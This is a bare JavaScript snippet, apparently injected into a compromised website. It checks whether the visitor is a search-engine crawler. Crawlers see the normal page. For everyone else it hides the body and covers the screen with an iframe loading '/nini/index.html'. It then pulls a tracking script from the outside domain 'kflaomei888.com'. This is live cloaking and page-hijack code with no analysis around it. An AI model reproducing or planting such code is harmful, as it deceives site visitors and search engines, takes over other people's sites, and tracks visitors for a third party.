var reg = /(bingbot|YandexBot|Baiduspider|Googlebot|360Spider|YisouSpider|Sogou inst spider|Sogou web spider|spider)/i;
if (!reg.test(navigator.userAgent)) {
    var adUrl = '/nini/index.html';
    document.write('<meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1">');
    var hd = document.head;
    var styleCSS = document.createElement('style'), adcc= document.createElement('div');
    styleCSS.innerHTML = 'body{position:relative;width:auto !important;height:100% !important;min-width:auto !important;overflow:hidden;display:none;} .adcc{position:fixed;top:0;left:0;right:0;bottom:0;z-index:9999999999;background:#000;}';
    adcc.setAttribute('class', 'adcc');
    adcc.innerHTML = '<iframe src=' + adUrl + ' frameborder="0" style="width:100%;height:100%"></iframe>';
    hd.appendChild(styleCSS);
    hd.parentNode.appendChild(adcc);
}


var _paq = window._paq = window._paq || [];
/* tracker methods like "setCustomDimension" should be called before "trackPageView" */
_paq.push(['trackPageView']);
_paq.push(['enableLinkTracking']);
(function() {
var u="//kflaomei888.com/";
_paq.push(['setTrackerUrl', u+'matomo.php']);
_paq.push(['setSiteId', '1']);
var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
})();
